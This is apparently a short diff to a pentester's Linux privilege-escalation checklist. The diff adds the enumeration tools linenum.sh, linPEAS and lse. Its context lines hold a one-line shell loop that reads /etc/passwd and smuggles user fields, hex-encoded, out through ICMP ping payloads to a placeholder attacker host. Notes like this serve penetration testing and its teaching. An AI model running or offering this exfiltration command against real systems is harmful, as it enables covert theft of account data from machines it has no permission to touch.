@@ -1,4 +1,8 @@
 # Linux Privilege Escalation Checklist
+# Tools:
+# - linenum.sh
+# - linPEAS
+# - lse
 
 # Exfiltrate users through ICMP
 while read line; do ping -c 1 -p $(echo "$line" | cut -d ":" -f 1,2,3,7 | xxd -ps) <my_attacking_host>; done < /etc/passwd
